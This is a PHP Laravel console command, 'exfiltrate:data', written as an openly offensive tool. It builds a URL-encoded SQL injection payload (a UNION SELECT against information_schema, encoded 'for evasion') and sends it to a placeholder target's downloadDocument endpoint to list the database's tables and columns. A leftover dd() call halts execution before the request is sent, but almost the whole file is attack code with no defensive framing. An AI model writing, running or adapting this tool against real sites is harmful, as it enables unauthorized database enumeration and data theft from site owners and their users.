<?php

namespace App\Console\Commands;

use Illuminate\Console\Command;
use Illuminate\Support\Facades\Http;

class ExfiltrateData extends Command
{
    protected $signature = 'exfiltrate:data {document_id}';
    protected $description = 'Exploit SQL injection to exfiltrate data';

    public function handle()
    {
        $documentId = $this->argument('document_id');

        // Example of a payload to exploit SQL injection
        $payload = $this->createPayload($documentId);
        dd($payload);

        // Send the request to the vulnerable endpoint
        $response = Http::get("http://target-site.com/downloadDocument", [
            'document_id' => $payload
        ]);

        // Output the response
        $this->info($response->body());
    }

    private function createPayload($documentId)
    {
        // Basic SQL injection payload
        $injection = "1' UNION SELECT column_name, table_name FROM information_schema.columns WHERE table_schema=database()--";

        // Encode the payload for evasion
        $encodedPayload = urlencode($documentId . $injection);

        return $encodedPayload;
    }
}
